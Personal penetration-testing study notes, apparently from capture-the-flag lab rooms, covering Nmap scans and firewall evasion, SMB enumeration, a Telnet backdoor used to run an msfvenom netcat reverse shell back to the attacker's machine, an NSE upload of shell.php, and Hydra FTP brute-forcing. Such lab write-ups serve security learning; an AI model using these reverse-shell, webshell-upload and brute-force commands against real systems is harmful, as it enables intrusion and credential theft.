### impooos
 - grep "ftp-anon" /usr/share/nmap/scripts/script.db  

 good tcp aggressive scan and saving the file on current dir named : nmapthm
 
- └─$ sudo nmap -p- -A -T5 -sT 10.10.212.180  -oN nmapthm

also this works fine and simple using syn scan

- nmap -vv  -T5 -oN NmapScan -p- 10.10.147.81

after getting open ports you need to scan specific port like this in order to focus on it

	sudo nmap -A -T4 -vv -p 8012 -oN NmapPortScan 10.10.147.81

Explanation of Changes:

- Removed `-sT`: It's unnecessary unless a full TCP connect scan is specifically needed.
- Removed `-sC`: It's included in `-A`.
- Adjusted `-T5` to `-T4`: `-T4` is fast but more reliable and less likely to cause issues with firewalls.


did an nmap scan 

found one open port now focus on it

**import**
	PORT     STATE SERVICE REASON  VERSION
	8012/tcp open  unknown syn-ack
	| fingerprint-strings: 
	|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
	|_    SKIDY'S BACKDOOR. Type .HELP to view commands


that scan says that this can be used ass a backdoor .   SKIDY'S BACKDOOR.


this  opens the txt file in SMB server !

smb: \>  more "Working From Home Information.txt" 


know that important file  in ssh is 
id_rsa

user could be found in public id rsa 
![[Pasted image 20250107204606.png]]
##  **Understanding SMB (Server Message Block Protocol)**

- **Definition**: A client-server communication protocol used for sharing access to files, printers, serial ports, and other resources over a network.
- **How It Works**:
    - Servers make file systems and resources (e.g., printers, named pipes) available to clients.
    - Clients connect to servers using protocols like TCP/IP (NetBIOS over TCP/IP), NetBEUI, or IPX/SPX.
    - Once connected, clients send commands (SMBs) to access shares, open files, read/write files, and perform file system operations over the network.
- **Key Features**:
    - **==Response-Request Protocol==**: Transmits multiple messages between client and server to establish a connection.
    - **Cross-Platform Support**:
        - **Windows**: Native support since Windows 95 (both client and server).
        - **Unix/Linux**: Supported via **Samba**, an open-source SMB implementation.


## Network Scanning

==NmapROOM==




### intro
###### 1. **Understanding Port Scanning**
   - **Purpose**: Port scanning is the process of identifying open ports on a target system. Open ports indicate running services, which are potential entry points for further exploitation.
   - **Types of Ports**:
     - **Open**: The port is actively accepting connections.
     - **Closed**: The port is accessible but no service is listening.
     - **Filtered**: The port is blocked by a firewall or other network device, making it difficult to determine if it's open or closed.

###### 2. **Why Nmap?**
   - **Versatility**: Nmap supports a wide range of scan types (e.g., TCP SYN, UDP, OS detection, version detection).
   - **Scripting Engine**: Nmap Scripting Engine (NSE) allows for advanced tasks like vulnerability detection, service enumeration, and even exploitation.
   - **Community Support**: Nmap has a large community, extensive documentation, and regular updates.
   


![[Pasted image 20250106161124.png]]
###### **Key Switches and Commands**

1. **Syn Scan**:
    
    - **Switch**: `-sS`
    - **Definition**: A stealthy scan that sends SYN packets to check for open ports without completing the TCP handshake.
2. **UDP Scan**:
    
    - **Switch**: `-sU`
    - **Definition**: Scans for open UDP ports, which are often overlooked but can be critical.
3. **Operating System Detection**:
    
    - **Switch**: `-O`
    - **Definition**: Detects the operating system running on the target.
4. **Service Version Detection**:
    
    - **Switch**: `-sV`
    - **Definition**: Identifies the version of services running on open ports.
5. **Verbosity Levels**:
    
    - **Increase Verbosity**: `-v` (level 1), `-vv` (level 2)
    - **Definition**: Provides more detailed output during the scan.
6. **Saving Scan Results**:
    
    - **Three Formats**: `-oA <filename>` (normal, XML, grepable formats).
    - **Normal Format**: `-oN <filename>`.
    - **Grepable Format**: `-oG <filename>` (useful for parsing with tools like `grep`).
7. **Aggressive Mode**:
    
    - **Switch**: `-A`
    - **Definition**: Activates OS detection, service detection, traceroute, and script scanning.
8. **Timing Templates**:
    
    - **Level 5 (Insane)**: `-T5`
    - **Definition**: Increases scan speed but may introduce noise and errors.
9. **Port Scanning**:
    
    - **Single Port**: `-p 80` (scans only port 80).
    - **Port Range**: `-p 1000-1500` (scans ports 1000 to 1500).
    - **All Ports**: `-p-` (scans all 65535 ports).
10. **Nmap Scripting Engine (NSE)**:
    
    - **Activate Script**: `--script <script-name>`.
    - **Vuln Category**: `--script vuln` (runs all scripts in the "vuln" category).


### overview
Here’s a concise summary of the **Nmap port scan types** and their purposes:

---

###### **Basic Scan Types**
1. **TCP Connect Scan (`-sT`)**:
   - **How it works**: Completes the full TCP three-way handshake.
   - **Use case**: Reliable but easily detectable by firewalls and IDS.
   - **Definition**: Establishes a full connection to the target port.

2. **SYN "Half-open" Scan (`-sS`)**:
   - **How it works**: Sends a SYN packet and waits for a SYN-ACK response without completing the handshake.
   - **Use case**: Stealthier than TCP Connect Scan; avoids full connection.
   - **Definition**: A stealth scan that doesn’t fully establish a connection.

3. **UDP Scan (`-sU`)**:
   - **How it works**: Sends UDP packets to check for open UDP ports.
   - **Use case**: Scans for UDP services (e.g., DNS, DHCP).
   - **Definition**: Detects open UDP ports, which are often overlooked.

---

###### **Less Common Scan Types**
4. **TCP Null Scan (`-sN`)**:
   - **How it works**: Sends a TCP packet with no flags set.
   - **Use case**: Bypasses some firewalls; useful for detecting closed ports.
   - **Definition**: A stealth scan that sends packets with no flags.

5. **TCP FIN Scan (`-sF`)**:
   - **How it works**: Sends a TCP packet with the FIN flag set.
   - **Use case**: Detects closed ports; often evades firewalls.
   - **Definition**: A stealth scan that uses the FIN flag.

6. **TCP Xmas Scan (`-sX`)**:
   - **How it works**: Sends a TCP packet with FIN, PSH, and URG flags set (like a "lit-up" Christmas tree).
   - **Use case**: Detects closed ports; often evades firewalls.
   - **Definition**: A stealth scan that uses multiple flags.

---

###### **ICMP (Ping) Scanning**
- **Purpose**: Determines if a host is online.
- **How it works**: Sends ICMP echo requests (ping) to check for responses.
- **Use case**: Initial reconnaissance to identify live hosts on a network.

---

###### **Key Takeaways**
- **TCP Connect Scan (`-sT`)**: Reliable but detectable.
- **SYN Scan (`-sS`)**: Stealthy and commonly used.
- **UDP Scan (`-sU`)**: Essential for UDP services.
- **Null, FIN, and Xmas Scans (`-sN`, `-sF`, `-sX`)**: Stealthy scans for bypassing firewalls.
- **ICMP Scanning**: Used to identify live hosts.

Let me know if you need further details or examples!

### TCP Connect Scans

Here’s a concise summary of the **TCP Connect Scan (`-sT`)** and its behavior, along with the answer to your question:

> [==RFC 9293](https://datatracker.ietf.org/doc/html/rfc9293)==
> A Request for Comments (RFC) is a publication in a series from the principal technical development and standards-setting bodies for the Internet, most prominently the Internet Engineering Task Force (IETF).
> 
---

###### **TCP Connect Scan (`-sT`)**
- **How it works**: Performs a full **TCP three-way handshake** with each target port.
  1. **SYN**: Nmap sends a TCP packet with the SYN flag set.
  2. **SYN-ACK**: If the port is open, the target responds with SYN-ACK.
  3. **ACK**: Nmap completes the handshake by sending an ACK.
![[Pasted image 20250106161209.png]]


- **Responses**:
  - **Open Port**: Target responds with SYN-ACK.
  - **Closed Port**: Target responds with RST (Reset).
  - **Filtered Port**: No response (firewall drops the packet).

- **Use Case**: Reliable but easily detectable by firewalls and IDS.

---

###### **Firewall Behavior**
- Firewalls can **drop packets** (no response) or **send RST packets** to make ports appear closed.
- Example IPtables command to send RST:
  ```bash
  iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset
  ```

###### **RFC for TCP Protocol**
- **RFC 9293**: Defines the appropriate behavior for the TCP protocol, including responses to SYN packets.

---


### SYN Scans

Here’s a concise summary of **SYN Scans (`-sS`)** and their key points:

---

###### **SYN Scan (`-sS`)**
- **Also Known As**: "==Half-open==" or "==Stealth==" scan.
- **How it works**:
  1. **SYN**: Nmap sends a TCP packet with the SYN flag set.
  2. **SYN-ACK**: If the port is open, the target responds with SYN-ACK.
  3. **RST**: Nmap sends a RST (Reset) packet instead of completing the handshake.

---

###### **Advantages of SYN Scans**
1. **Stealth**:
   - Bypasses older Intrusion Detection Systems (IDS) that look for a full three-way handshake.
   - Often not logged by applications, as connections are logged only after being fully established.
2. **Speed**:
   - Faster than TCP Connect scans (`-sT`) because it doesn’t complete the handshake.

---

###### **Disadvantages of SYN Scans**
1. **Requires Sudo Permissions**:
   - Needs root privileges to create raw packets.
   - Without sudo, Nmap defaults to TCP Connect scans (`-sT`).
2. **Potential Service Disruption**:
   - Unstable services may crash due to incomplete connections.

---

###### **Behavior for Closed and Filtered Ports**
- **Closed Port**: Target responds with a RST packet.
- **Filtered Port**: No response (firewall drops the packet) or spoofed RST packet.

---

###### **Key Takeaways**
- SYN scans are faster and stealthier than TCP Connect scans.
- They are the **default scan type** when Nmap is run with sudo permissions.
- Ideal for identifying open ports while minimizing detection and logging.

---

Let me know if you need further clarification or examples!


### UDP scans


1. **UDP Scan Basics**:
   - UDP scans are performed using the `-sU` switch in Nmap.
   - UDP is stateless, meaning there is no handshake, making it faster but less reliable than TCP.

2. **Port States in UDP Scans**:
   - ==**Open|Filtered**==: No response is received, indicating the port might be open or filtered by a firewall.
   - **==Open==**: A UDP response is received (rare).
   - **==Closed==**: An ICMP "port unreachable" message is received.

3. **Challenges with UDP Scans**:
   - UDP scans are slow due to the lack of responses and the need for retransmissions.
   - Scanning all 1000 ports can take around 20 minutes or more.

4. **Optimizing UDP Scans**:
   - Use `--top-ports <number>` to scan only the most commonly used UDP ports, significantly reducing scan time. For example:
     ```bash
     nmap -sU --top-ports 20 <target>
     ```
   - Nmap sends empty UDP packets by default but uses protocol-specific payloads for well-known services to improve accuracy.

If you're planning to perform a UDP scan, let me know the target or any specific requirements, and I can help refine the command or interpret the results.

### NULL, FIN and Xmas

Your explanation of **NULL**, **FIN**, and **Xmas TCP scans** is thorough and accurate. These scans are indeed less common but can be useful for stealthy reconnaissance and firewall evasion. Here's a concise breakdown of the key points:

---

###### **1. NULL Scan (`-sN`)**:
- **How it works**: Sends a TCP packet with **no flags set**.
- **Expected response**:
  - **Closed port**: Receives a **RST (Reset)** packet.
  - **Open port**: No response (marked as `open|filtered`).
- **Use case**: Stealthy scanning, as it doesn't use the SYN flag, which is often monitored by firewalls.
- ![[Pasted image 20250106161232.png]]
- 

---

###### **2. FIN Scan (`-sF`)**:
- **How it works**: Sends a TCP packet with only the **FIN flag** set (used to gracefully close a connection).
- **Expected response**:
  - **Closed port**: Receives a **RST** packet.
  - **Open port**: No response (marked as `open|filtered`).
- **Use case**: Similar to NULL scans, but slightly more likely to elicit a response due to the FIN flag.
- ![[Pasted image 20250106161251.png]]
- 

---

###### **3. Xmas Scan (`-sX`)**:
- **How it works**: Sends a TCP packet with the **FIN**, **PSH**, and **URG flags** set (resembling a "blinking Christmas tree" in packet captures).
- **Expected response**:
  - **Closed port**: Receives a **RST** packet.
  - **Open port**: No response (marked as `open|filtered`).
- **Use case**: Stealthy scanning, with the added benefit of potentially confusing some IDS/IPS systems.
- ![[Pasted image 20250106161316.png]]

---

###### **Key Observations**:
1. **Firewall Evasion**:
   - T==hese scans bypass firewalls== that drop packets with the SYN flag set, as they don't use SYN.
   - ==However, modern IDS/IPS systems== are often aware of these techniques and may still detect them.

2. **Limitations**:
   - ==**Windows and Cisco Devices**==: These systems often respond with a RST to malformed packets, regardless of port state, making these scans ineffective against them.
   - **==Open Ports==**: Cannot definitively identify open ports, as no response could mean the port is open or filtered by a firewall.

3. **==Stealth==**:
   - These scans are stealthier than SYN scans ==but are not foolproof== against advanced detection systems.

---

###### **==When to Use These Scans==**:
- When you need to perform **stealthy reconnaissance** on a target.
- When you suspect a firewall is dropping SYN packets and want to bypass it.
- When you are scanning non-Windows or non-Cisco systems, as these scans are less effective against those platforms.

---

###### **Example Commands**:
- **NULL Scan**:
  ```bash
  nmap -sN <target>
  ```
- **FIN Scan**:
  ```bash
  nmap -sF <target>
  ```
- **Xmas Scan**:
  ```bash
  nmap -sX <target>
  ```

---

If you're planning to use these scans, let me know the target or any specific requirements, and I can help refine the approach or interpret the results.
### Nmap Ping Sweep Overview

---

###### **Ping Sweep (`-sn` switch)**

- **Purpose**: Identifies live hosts by sending ICMP echo requests and TCP SYN/ACK packets.
- **How it works**:
    - Sends **ICMP Echo** and **TCP SYN** to port 443, plus **TCP ACK/SYN** to port 80.
    - Hosts that respond are marked as "alive."

---

###### **Nmap Syntax**

- **Command examples**:
    - `nmap -sn 192.168.0.1-254`
    - `nmap -sn 192.168.0.0/24`

---

###### **Key Points**

1. **No port scan**: The `-sn` option skips port scanning.
2. **ICMP & TCP**: Uses ICMP and TCP responses (port 443/80) for host discovery.
3. **==Limitations==**: Firewalls may block ICMP or alter responses, leading to false negatives.

---

###### **Why Use It?**

- **Initial reconnaissance**: Helps map out active hosts in a network.
- **Baseline**: Provides a quick, though sometimes imperfect, host list for further scans.

---

How would you perform a ping sweep on the 172.16.x.x network (Netmask: 255.255.0.0) using Nmap? (CIDR notation)

 - nmap -sn 172.16.0.0/16

### Nmap Scripting Engine (NSE) Overview

---

###### **What is NSE?**

- **Purpose**: Extends Nmap’s functionality with scripts written in **Lua**.
- **Use Cases**: Vulnerability scanning, exploitation, reconnaissance, and automation.

---

###### **NSE Script Categories**

1. **safe**: Non-intrusive; won’t affect the target.
2. **intrusive**: Likely to affect the target; risky.
3. **vuln**: Scans for vulnerabilities.
4. **exploit**: Attempts to exploit discovered vulnerabilities.
5. **auth**: Tries to bypass authentication (e.g., FTP login).
6. **brute**: Attempts brute-force credential attacks.
7. **discovery**: Gathers additional information about the target network (e.g., SNMP queries).

---

###### **Key Takeaways**

- The **NSE** is a powerful tool for reconnaissance and exploiting vulnerabilities.
- Scripts can be categorized by their risk level and purpose.
- Understanding these categories helps choose the right script for your task.

---
A more exhaustive list can be found [here](https://nmap.org/book/nse-usage.html).

### Running Nmap Scripts with NSE

---

###### **Activating NSE Scripts**

- **General Command**: Use `--script=<category>` to run scripts from a specific category (e.g., `--script=safe` for safe scripts).
- **Example**: `nmap --script=vuln` runs all vulnerability scanning scripts.

---

###### **Running Specific Scripts**

- To run a specific script, use the script’s name:  
    `nmap --script=<script-name>` (e.g., `--script=http-fileupload-exploiter`).
    
- **Multiple Scripts**: Separate scripts by commas:  
    `nmap --script=smb-enum-users,smb-enum-shares`.
    

---

###### **Passing Arguments to Scripts**

- Some scripts require arguments, which can be provided with `--script-args`.
- **Example**: Upload a file using the `http-put` script:
    
    ```bash
    nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'
    ```
    
- **Note**: Arguments are comma-separated and use `<script-name>.<argument>` format.

---

###### ==**Accessing Script Help**==

- To see built-in help for a specific script:
    
    ```bash
    nmap --script-help <script-name>
    ```
    
- This provides a brief guide, though the full documentation is available online.

---

A full list of scripts and their corresponding arguments (along with example use cases) can be found [here](https://nmap.org/nsedoc/).

### Finding Nmap Scripts

---

###### **Where to Find Nmap Scripts**

1. **Official List**: Nmap's official website provides a list of all NSE scripts.
2. **Local Storage**: On Linux, Nmap stores its scripts at:  
    `/usr/share/nmap/scripts`

---

###### **Searching for Scripts Locally**

1. **Using `script.db`**:
    
    - The `script.db` file contains filenames and categories of scripts. It’s a text file, not a real database.
    - **Search example**:
        
        ```bash
        grep "ftp" /usr/share/nmap/scripts/script.db
        ```
        
    - This command finds all scripts related to FTP.
2. **Using `ls` Command**:
    
    - You can list scripts matching a search term with `ls`.
    - **Search example**:
        
        ```bash
        ls -l /usr/share/nmap/scripts/*ftp*
        ```
        

---

###### **Searching for Script Categories**

- Use the same methods to find scripts by category.
    - **Example**: To find all "safe" scripts:
        
        ```bash
        grep "safe" /usr/share/nmap/scripts/script.db
        ```
        

---


### Installing Missing Nmap Scripts

---

###### **Fixing Missing Scripts**

- If a script is missing locally, you can:
    1. **Update Nmap**: Run the following to update and reinstall Nmap:
        
        ```bash
        sudo apt update && sudo apt install nmap
        ```
        
    2. **Manually Install a Script**:
        - Download the script directly from Nmap’s repository:
            
            ```bash
            sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse
            ```
            
        - After downloading, update the `script.db` file:
            
            ```bash
            sudo nmap --script-updatedb
            ```
            

---

###### **Adding Custom Scripts**

- If you create your own NSE script (with basic Lua knowledge), you can add it manually:
    1. Place the script in `/usr/share/nmap/scripts/`.
    2. Run `nmap --script-updatedb` to update the `script.db` file.

---


### Bypassing Firewalls with Nmap

---

###### **Problem: ICMP Block on Windows Hosts**

- **Issue**: Default Windows firewalls block ICMP packets, preventing Nmap from detecting hosts as "alive."
- **Solution**: Use the `-Pn` switch to skip the ping check and assume the host is up, even if ICMP is blocked.

---

###### **Using the `-Pn` Switch**

- **Command**:
    
    ```bash
    nmap -Pn <target>
    ```
    
- **Effect**: Treats the target as alive, bypassing the ICMP check. This can result in longer scan times if the host is truly down, as Nmap won't know until it tests the ports.

---

###### **Additional Firewall Evasion Techniques**

Nmap provides several other switches to help evade firewalls or Intrusion Detection Systems (IDS):

1. **Fragmenting Packets (`-f`)**:
    
    - **Purpose**: Splits packets into smaller pieces to evade detection by firewalls/IDS.
    - **Command**:
        
        ```bash
        nmap -f <target>
        ```
        
2. **Control Packet Size (`--mtu <number>`)**:
    
    - **Purpose**: Sets the maximum transmission unit (MTU) for packet size, allowing more control than `-f`.
    - **Command**:
        
        ```bash
        nmap --mtu 1280 <target>
        ```
        
    - **Note**: MTU must be a multiple of 8.
3. **Packet Delay (`--scan-delay <time>ms`)**:
    
    - **Purpose**: Adds a delay between packets, helping to avoid time-based IDS/firewall triggers or manage network instability.
    - **Command**:
        
        ```bash
        nmap --scan-delay 200ms <target>
        ```
        
4. **Invalid Checksum (`--badsum`)**:
    
    - **Purpose**: Sends packets with an invalid checksum, which a real TCP/IP stack would drop but may trigger a firewall/IDS response.
    - **Command**:
        
        ```bash
        nmap --badsum <target>
        ```
        

---


###### **Key Takeaways**

- The `-Pn` switch is crucial for bypassing ICMP-blocking firewalls, but it can lead to longer scan times if the host is down.
- Additional switches like `-f`, `--mtu`, `--scan-delay`, and `--badsum` offer advanced techniques for evading firewalls and IDS.
- For local networks, Nmap can use ARP requests to detect active hosts, bypassing the need for ICMP.

---

There are a variety of other switches which Nmap considers useful for firewall evasion. We will not go through these in detail, however, they can be found [here](https://nmap.org/book/man-bypass-firewalls-ids.html).

### 
**AI generated Basic Nmap Commands**
   Here are some fundamental `nmap` commands to get started:

   - **Basic Scan**:  
     ```bash
     nmap <target_ip>
     ```
     This performs a default TCP SYN scan on the most common 1000 ports.

   - **Scan All Ports**:  
     ```bash
     nmap -p- <target_ip>
     ```
     This scans all 65535 ports on the target.

   - **Service Version Detection**:  
     ```bash
     nmap -sV <target_ip>
     ```
     This attempts to determine the version of the services running on open ports.

   - **OS Detection**:  
     ```bash
     nmap -O <target_ip>
     ```
     This tries to identify the operating system of the target.

   - **Aggressive Scan**:  
     ```bash
     nmap -A <target_ip>
     ```
     This combines OS detection, version detection, script scanning, and traceroute.

   - **UDP Scan**:  
     ```bash
     nmap -sU <target_ip>
     ```
     This scans for open UDP ports, which are often overlooked but can be critical.

###### 4. **Interpreting Nmap Results**
   - **Open Ports**: Focus on these for further enumeration and potential exploitation.
   - **Service Versions**: Knowing the exact version of a service can help identify known vulnerabilities.
   - **OS Information**: Helps tailor your attack to the specific operating system.

###### 5. **Next Steps After Port Scanning**
   - **Service Enumeration**: Use tools like `nmap` scripts, `nikto`, or `gobuster` to gather more information about the services running on open ports.
   - **Vulnerability Scanning**: Use tools like `nmap` NSE scripts, `Nessus`, or `OpenVAS` to identify potential vulnerabilities.
   - **Exploitation**: Based on the findings, proceed with exploitation using tools like `Metasploit`, `sqlmap`, or custom scripts.

###### 6. **Best Practices**
   - **Stealth**: Use techniques like `-sS` (SYN scan) to avoid detection by intrusion detection systems (IDS).
   - **Rate Limiting**: Use `--max-rate` to control the speed of your scans and avoid overwhelming the target.
   - **Logging**: Always log your scans using `-oA` to save results in multiple formats for later analysis.

###### 7. **Example Scenario**
   Suppose you have a target IP `192.168.1.100`. You might start with:
   ```bash
   nmap -sV -O -A 192.168.1.100
   ```
   This will give you a comprehensive overview of the target, including open ports, service versions, and OS information.

By following these steps, you can effectively map out the target's network landscape and identify potential attack vectors. Let me know if you'd like to dive deeper into any specific aspect!

## Enumerating SMB


- **Purpose**: Enumerates SMB shares on Windows/Linux systems.
- **Function**: Wrapper for Samba tools to extract SMB information easily.
- **Availability**: Pre-installed on AttackBox; installable from GitHub.

### Syntax:

```bash
enum4linux [options] ip
```

### Common Tags and Functions:

- **-U**: Get user list
- **-M**: Get machine list
- **-N**: Get namelist dump (different from -U and -M)
- **-S**: Get share list
- **-P**: Get password policy info
- **-G**: Get group and member list
- **-a**: Full enumeration (all options above)


## Exploiting SMB



- **Common Exploit**: Misconfigured SMB shares (e.g., anonymous SMB access) rather than vulnerabilities like[CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/).
- **Goal**: Gain information from SMB share misconfigurations to access a shell.

### Method Breakdown:

- **From Enumeration**:
    - Know the **SMB share location**
    - Know the **name of an interesting SMB share**

### SMBClient

- **Purpose**: Access SMB shares remotely.
- **Availability**: Part of the Samba suite (pre-installed on AttackBox; installable via documentation).

### Syntax:

```bash
smbclient //[IP]/[SHARE] -U [name] -p [port]
```

- **-U [name]**: Specify the username
- **-p [port]**: Specify the port

smbclient //10.10.212.180/profiles -U anonymous    
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> 


![[Pasted image 20250107194647.png]]

used  to read whts in the file and found the user name
more "Working From Home Information.txt"


This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

id_rsa

found the user name on 
id_rsa.pub (public key)

then logged in.

![[Pasted image 20250107204913.png]]

## Telnet

- **What is Telnet?**
    
    - An ==application protocol== that allows connecting to a remote machine to execute commands.
    - The **Telnet client** connects to the server, acting as a virtual terminal for interacting with the remote host.
- **Replacement**:
    
    - Telnet sends data in **clear text** and lacks security mechanisms.
    - **SSH** (Secure Shell) is commonly used as a more secure replacement.
    - ![[Pasted image 20250107211208.png]]
- **How Telnet Works**:
    
    - Use the command: `telnet [ip] [port]`
    - The user connects to the server and can execute commands using **Telnet commands** in the Telnet prompt.

### Telnet Exploit Summary

###### **Why Telnet is Vulnerable**:

- **Insecure Protocol**: Lacks encryption, sends data in plaintext, and often has poor access control.
- **CVE Vulnerabilities**: Check for Telnet-related CVEs at:
    - [CVE Details](https://www.cvedetails.com/)
    - [CVE Mitre](https://cve.mitre.org/)
- **Misconfigurations**: Exploits often result from poor Telnet setup rather than protocol flaws.

---

###### **Method Breakdown**:

1. **From Enumeration**:
    
    - **Telnet service**: Poorly hidden and marked as "backdoor."
    - **Possible username**: "Skidy" identified.
2. **Goal**: Use Telnet to gain a foothold, then escalate to a **reverse shell**.
    

---

###### **Connecting to Telnet**:

- Command:
    
    ```bash
    telnet [ip] [port]
    ```
    

---

#### **What is a Reverse Shell?**
![[Pasted image 20250107220259.png]]

- **Definition**: A shell that allows the target machine to connect back to the attacker's machine.
- **How it Works**:
    - **Attacking Machine**: Listens on a port for incoming connections.
    - **Target Machine**: Establishes the connection, enabling command/code execution.


##### Using telnet and tcpdump listening 

connect to telnet :

└─$ telnet   10.10.147.81   8012
 


This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on

- `sudo tcpdump ip proto \\icmp -i tun0`


only the last one had run correctly 
![[Pasted image 20250107221447.png]]



![[Pasted image 20250107221505.png]]
##### using msfvenom

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:  

**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

-p = payload

lhost = our local host IP address (this is **your** machine's IP address)

lport = the port to listen on (this is the port on **your** machine)

R = export the payload in raw format


this did not work , how i fixed it :

ip a 

gets the ip the put it directly in lhost

└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.21.117.138 lport=4444 R

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

**"nc -lvnp [listening port]"**


Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

![[Pasted image 20250107223617.png]]


![[Pasted image 20250107223636.png]]

cat flag.txt

found the flag.


## FTP

**Definition**:  
FTP is a protocol used for transferring files between computers over a network. It works on a ==client-server== model, where a client sends commands and the server responds, transferring files as requested.

---

### **How FTP Works**:

- **Two Channels**:
    
    1. **Command (Control) Channel**: Used for sending commands and receiving responses.
    2. **Data Channel**: Used for transferring the actual data (files).
- **Client-Server Interaction**:
    
    - The **client** initiates a connection to the **server** and provides login credentials.
    - After validation, the session is opened and the client can issue commands to the server.

---

### **Active vs. Passive FTP**:

- **Active FTP**:
    
    - The **client** opens a port and listens.
    - The **server** actively connects to the client's open port to transfer data.
- **Passive FTP**:
    
    - The **server** opens a port and listens.
    - The **client** connects to the server's open port for data transfer.

The distinction allows for more efficient transfers, especially in situations involving firewalls or NAT (Network Address Translation).

---

For further technical details, refer to the official **RFC 959** document:  
[FTP RFC - IETF](https://www.ietf.org/rfc/rfc959.txt).

![[Pasted image 20250107230536.png]]



###### **Types of FTP Exploits**

FTP, like Telnet, is vulnerable due to the fact that both the **command** and **data channels** transmit data in **plaintext**. This can allow attackers to intercept sensitive information, such as passwords, especially if a **man-in-the-middle (MITM)** attack occurs.

**Key FTP Exploit:**

- **Man-in-the-Middle (MITM) Attack**: Since FTP data is unencrypted, an attacker could use techniques like **ARP Poisoning** to intercept sensitive data (including passwords) sent during the FTP session.

**FTP Server Misconfiguration:**

- One common exploit is when FTP servers use **weak or default passwords**, which attackers can exploit through **brute-force** attacks.

---

###### **Method Breakdown for Brute-Forcing FTP Passwords**

From the information gathered during enumeration, we know that:

- An **FTP server** is running.
- We have a **possible username**.

With this, we can try to brute-force the FTP password using tools like **Hydra**.

---

###### **Hydra Tool for FTP Brute-Forcing**

**Hydra** is a powerful password-cracking tool that supports **over 50 protocols**, including FTP. It can perform rapid **dictionary attacks** on various services.

**Command Syntax for Hydra:**

```bash
hydra -t 4 -l [username] -P [path to wordlist] -vV [target IP] ftp
```

###### **Breaking Down the Command**:

|**Section**|**Function**|
|---|---|
|`hydra`|Executes the Hydra tool|
|`-t 4`|Specifies **4 parallel connections** for faster cracking|
|`-l [user]`|Specifies the **username** for the account being targeted (e.g., "dale")|
|`-P [path to wordlist]`|Specifies the path to a **wordlist** of potential passwords (e.g., "rockyou.txt")|
|`-vV`|Enables **verbose mode**, showing login attempts and results|
|`[target IP]`|The **IP address** of the target machine|
|`ftp`|Specifies the **FTP protocol** for Hydra to attack|

---

###### **Example Command**:

```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

This command will attempt to crack the FTP password for the user **dale** on the server at **10.10.10.6**, using the **rockyou.txt** wordlist.

---
